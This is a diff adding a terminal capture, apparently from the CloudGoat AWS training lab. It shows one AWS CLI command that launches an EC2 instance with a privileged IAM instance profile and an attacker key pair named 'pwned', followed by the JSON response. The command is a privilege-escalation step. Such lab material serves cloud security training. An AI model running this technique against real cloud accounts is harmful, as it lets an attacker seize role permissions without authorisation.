@@ -1,0 +1,107 @@
+root@kali:~/cloudgoat# aws ec2 run-instances --image-id ami-0a313d6098716f372 --iam-instance-profile Arn=arn:aws:iam::537095765475:instance-profile/cg-ec2-meek-instance-profile-cgid4he2dx6ly1 --key-name pwned --profile Kerrigan --subnet-id subnet-08df94bd5805efeb3 --security-group-ids sg-09bd44681b183f9bb
+{
+    "Groups": [],
+    "Instances": [
+        {
+            "AmiLaunchIndex": 0,
+            "ImageId": "ami-0a313d6098716f372",
+            "InstanceId": "i-0c9b8cb34e7b8b6cf",
+            "InstanceType": "m1.small",
+            "KeyName": "pwned",
+            "LaunchTime": "2020-02-12T10:12:00.000Z",
+            "Monitoring": {
+                "State": "disabled"
+            },
+            "Placement": {
+                "AvailabilityZone": "us-east-1a",
+                "GroupName": "",
+                "Tenancy": "default"
+            },
+            "PrivateDnsName": "ip-10-0-10-112.ec2.internal",
+            "PrivateIpAddress": "10.0.10.112",
+            "ProductCodes": [],
+            "PublicDnsName": "",
+            "State": {
+                "Code": 0,
+                "Name": "pending"
+            },
+            "StateTransitionReason": "",
+            "SubnetId": "subnet-08df94bd5805efeb3",
+            "VpcId": "vpc-08a002a01ea06e879",
+            "Architecture": "x86_64",
+            "BlockDeviceMappings": [],
+            "ClientToken": "",
+            "EbsOptimized": false,                                                                                                                                                                                                         
+            "Hypervisor": "xen",
+            "IamInstanceProfile": {
+                "Arn": "arn:aws:iam::537095765475:instance-profile/cg-ec2-meek-instance-profile-cgid4he2dx6ly1",
+                "Id": "AIPAX2DLG7XR7CCUH7LXI"
+            },
+            "NetworkInterfaces": [
+                {
+                    "Attachment": {
+                        "AttachTime": "2020-02-12T10:12:00.000Z",
+                        "AttachmentId": "eni-attach-07e1032a01cc8ddfc",
+                        "DeleteOnTermination": true,
+                        "DeviceIndex": 0,
+                        "Status": "attaching"
+                    },
+                    "Description": "",
+                    "Groups": [
+                        {
+                            "GroupName": "cg-ec2-http-cgid4he2dx6ly1",
+                            "GroupId": "sg-09bd44681b183f9bb"
+                        }
+                    ],
+                    "Ipv6Addresses": [],
+                    "MacAddress": "02:25:69:27:cb:03",
+                    "NetworkInterfaceId": "eni-0a801bcad0e2d9c1f",
+                    "OwnerId": "537095765475",
+                    "PrivateDnsName": "ip-10-0-10-112.ec2.internal",
+                    "PrivateIpAddress": "10.0.10.112",
+                    "PrivateIpAddresses": [
+                        {
+                            "Primary": true,
+                            "PrivateDnsName": "ip-10-0-10-112.ec2.internal",
+                            "PrivateIpAddress": "10.0.10.112"
+                        }
+                    ],
+                    "SourceDestCheck": true,
+                    "Status": "in-use",
+                    "SubnetId": "subnet-08df94bd5805efeb3",
+                    "VpcId": "vpc-08a002a01ea06e879",
+                    "InterfaceType": "interface"
+                }
+            ],
+            "RootDeviceName": "/dev/sda1",
+            "RootDeviceType": "ebs",
+            "SecurityGroups": [
+                {
+                    "GroupName": "cg-ec2-http-cgid4he2dx6ly1",
+                    "GroupId": "sg-09bd44681b183f9bb"
+                }
+            ],
+            "SourceDestCheck": true,
+            "StateReason": {
+                "Code": "pending",
+                "Message": "pending"
+            },
+            "VirtualizationType": "hvm",
+            "CpuOptions": {
+                "CoreCount": 1,
+                "ThreadsPerCore": 1
+            },
+            "CapacityReservationSpecification": {
+                "CapacityReservationPreference": "open"
+            },
+            "MetadataOptions": {
+                "State": "pending",
+                "HttpTokens": "optional",
+                "HttpPutResponseHopLimit": 1,
+                "HttpEndpoint": "enabled"
+            }
+        }
+    ],
+    "OwnerId": "537095765475",
+    "ReservationId": "r-064745675b6a38ca2"
+}
